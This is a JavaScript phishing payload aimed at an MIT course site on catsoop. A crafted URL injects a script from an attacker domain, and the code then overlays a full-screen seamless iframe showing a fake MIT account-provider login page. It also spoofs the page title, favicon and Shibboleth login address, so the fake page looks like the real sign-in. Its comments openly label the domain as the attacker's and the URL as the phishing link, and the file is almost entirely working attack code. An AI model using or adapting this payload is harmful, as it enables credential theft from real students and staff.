var ORIG_DOM='https://6002.catsoop.org/S20/ex01/big_and_small';		var FINAL_DOM='https://6002.catsoop.org/S20/ex01/big_and_small';		var DOMAIN='https://6002.ml';		var PHISHING_URL='https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/';		// Note: all this js will be loaded in double quotes, so must escape use single quotes or esacaped double quotes
// var DOMAIN = attacker domain
// var ORIG_DOM = origianl catsoop domain url
// var FINAL_DOM; = final catsoop domain url
// var PHISHING_URL = fishing url
if (window.localStorage.getItem('loggedIn') == 'true') {
	window.parent.postMessage('exit', '*')
}

// set favicon
var q = document.querySelectorAll('[rel=\'icon\']');
var icon = '';
if (q.length > 0) icon = q[0].href;
// set title
var title = '';
var t = document.getElementsByTagName('title')
if (t.length > 0) title = t[0].innerHTML;
window.postMessage({'icon': icon, 'title': title}, '*');

//window.parent.postMessage('loaded', '*');



// on login click handler
window.nextWin = function nextWin() { 
	//var url = ORIG_DOM + '/idp/Authn/MIT?conversation=e1s1';
	//window.parent.postMessage({'url': url, 'icon': DOMAIN + '/idp/Authn/images/favicon.ico', title: 'Account Provider Selection'}, '*');
	var page = 'provider.html';
	var mobile = false;
	if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
		page = 'mobile-provider.html';
		mobile = true;
	}
	var s = '<iframe frameborder=\'0\' seamless=\'seamless\' style=\'position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;\' src=\'https://' + window.ATTACK_DOM_NAME + '/idp/Authn/provider/' + page + '\'>';
	var delay = 100;
	if (mobile) { 
		s = '<head><meta name=\'viewport\' id=\'viewport\' content=\'width=device-width, user-scalable=yes\'></head><body>' + s + '</body>';
		delay = 400;	
	}
	window.postMessage({
		move  : '/idp/Authn/provider/' + page, 
		icon  : '/idp/Authn/images/favicon.ico',
		title : 'Account Provider Selection', 
		url   : '/wayf/mit/DS?entityID=https%3A%2F%2Fshimmer.csail.mit.edu%2Fshibboleth&return=https%3A%2F%2Fshimmer.csail.mit.edu%2FShibboleth.sso%2FLogin%3FSAMLDS%3D1%26target%3Dss%253Amem%253Abbea589c78bbd6c91444141cde046327fb0a184e800355616848a805cda71a78&lang=en',
		load  : 3
	}, '*');
}; 


